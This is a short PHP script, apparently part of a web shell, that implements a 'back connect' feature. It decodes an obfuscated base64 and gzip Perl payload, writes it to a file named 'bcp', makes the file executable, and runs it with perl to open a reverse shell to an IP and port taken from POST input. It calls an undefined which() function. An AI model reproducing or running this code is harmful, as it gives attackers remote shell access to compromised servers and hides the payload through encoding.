<?php
function Exe($command)
{
	$exec=$output='';
	$dep[]=array('pipe','r');$dep[]=array('pipe','w');
	if(function_exists('shell_exec'))$exec=@shell_exec($command);
	return $exec;
}

function tulis($file,$text)
{ 
	$textz = gzinflate(base64_decode($text)); 
	if($filez = @fopen($file,"w")) 
	{ 
		@fputs($filez,$textz); @fclose($file);
	} 
} 

$back_connect="fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St 

ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ 

ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";


$ip = trim($_POST['ip']);
$port = trim($_POST['backport']);
tulis("bcp",$back_connect);
Exe("chmod +x bcp"); 
$p2=which("perl");
Exe($p2." bcp ".$ip." ".$port." &");
$msg = "Now script try connect to ".$ip." port ".$port." ..."; 
?>